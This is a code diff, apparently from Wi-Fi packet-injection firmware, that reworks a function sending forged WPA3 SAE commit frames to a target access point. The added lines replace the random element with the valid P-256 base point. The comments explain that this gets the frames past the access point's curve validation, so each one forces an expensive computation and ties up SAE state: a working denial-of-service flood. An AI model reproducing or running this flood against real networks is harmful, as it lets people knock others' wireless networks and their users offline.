@@ -1313,7 +1313,24 @@ static void sae_send_commit(const uint8_t* bssid, const uint8_t* sta) {
   f[n++] = 0x01; f[n++] = 0x00;           // auth sequence: 1 = commit
   f[n++] = 0x00; f[n++] = 0x00;           // status code: success
   f[n++] = SAE_GROUP_P256; f[n++] = 0x00; // group id: NIST P-256
-  for(int i = 0; i < 32 + 64; i++) f[n++] = (uint8_t)random(0, 256);   // scalar + element
+  // Scalar: random on every frame, so each one costs the AP a different computation.
+  for(int i = 0; i < 32; i++) f[n++] = (uint8_t)random(0, 256);
+  // Element: the P-256 BASE POINT, i.e. deliberately a valid point. The order matters and it is
+  // easy to get wrong: an AP validates the element (on-curve check) BEFORE it derives the shared
+  // secret (IEEE 802.11-2016 12.4.5.4; hostapd sae_parse_commit_element_ecc() ->
+  // crypto_ec_point_is_on_curve() -> only then sae_process_commit()). A random element is almost
+  // certainly off the curve, so it would be rejected cheaply and the flood would cost the AP
+  // nothing. With a valid point the AP goes on to the scalar multiplication - the expensive half -
+  // and then keeps its SAE state waiting for a confirm that never arrives.
+  // The base point is public and fixed (NIST P-256 G, FIPS 186-4 / RFC 5903 3.2.1).
+  static const uint8_t gx[32] = {
+      0x6B,0x17,0xD1,0xF2,0xE1,0x2C,0x42,0x47,0xF8,0xBC,0xE6,0xE5,0x63,0xA4,0x40,0xF2,
+      0x77,0x03,0x7D,0x81,0x2D,0xEB,0x33,0xA0,0xF4,0xA1,0x39,0x45,0xD8,0x98,0xC2,0x96};
+  static const uint8_t gy[32] = {
+      0x4F,0xE3,0x42,0xE2,0xFE,0x1A,0x7F,0x9B,0x8E,0xE7,0xEB,0x4A,0x7C,0x0F,0x9E,0x16,
+      0x2B,0xCE,0x33,0x57,0x6B,0x31,0x5E,0xCE,0xCB,0xB6,0x40,0x68,0x37,0xBF,0x51,0xF5};
+  memcpy(f + n, gx, 32); n += 32;
+  memcpy(f + n, gy, 32); n += 32;
   memcpy(tx_stage, f, n);
   wifi_tx_raw_frame(tx_stage, n);
 }
